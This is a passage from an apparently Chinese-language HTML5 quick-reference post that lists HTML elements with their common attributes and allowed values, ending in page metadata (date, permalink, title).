程序: script, noscript, embed, object 常用属性 全局: class, contenteditable, data-*, dir, draggable, hidden, id, lang, spellcheck, style, tabindex, title html: manifest del: cite, datetime time: datetime form: accept-charset, action, autocomplete (on; off), enctype (application/x-www-form-urlencoded; multipart/form-data; text/plain), method (get; post), name, target (_blank; _parent; _self; _top) input: accept, alt, autocomplete, autofocus, checked, disabled, formaction, formenctype, formmethod, formtarget, height, maxlength, multiple, name, readonly, required, size, src, type (button; checkbox; color; date; datetime; datetime-local; email; file; hidden; image; month; number; password; radio; range; reset; search; submit; tel; text; time; url; week), value, width textarea: autofocus, cols, disabled, maxlength, name, readonly, required, rows, wrap button: autofocus, disabled, formaction, formenctype, formmethod, formtarget, name, type (button; reset; submit), value select: autofocus, disabled, multiple, name, required, size optgroup: disabled, label option: disabled, label, selected, value lable: for iframe: height, name, src, width img: loading (eager; lazy), alt, height, ismap, src, usemap, width area: alt, coords, href, hreflang, media, rel, shape (default; rect; circle; poly), target, type (MIME) canvas: height, width svg: height, width, xmlns (http://www.w3.org/2000/svg), version (1.1; 1.2; 2.0) audio: autoplay, controls, loop, src source: src, type, srcset video: autoplay, controls, height, loop, muted, poster, src, width a: download, href, hreflang, media, rel (altrenate; author; bookmark; help; license; next; nofollow; noreference; prefetch; prev; search; tag), target, type link: href, hreflang, media, rel, type th: colspan, headers, rowspan, scope (col; colgroup; row; rowgroup) td: colspan, headers, rowspan col: span colgroup: span base: href, target meta: charset, content, http-equiv, name script: async, charset, defer, src, type embed: height, src, type, width object: data, height, name, type, usemap, width 字符集 ASCII, utf-8, ISO-8859-1, URL, 实体符号, ISO-639-1\n","date":"2023-08-20T00:00:00Z","permalink":"https://example.com/p/html5/","title":"HTML5"}]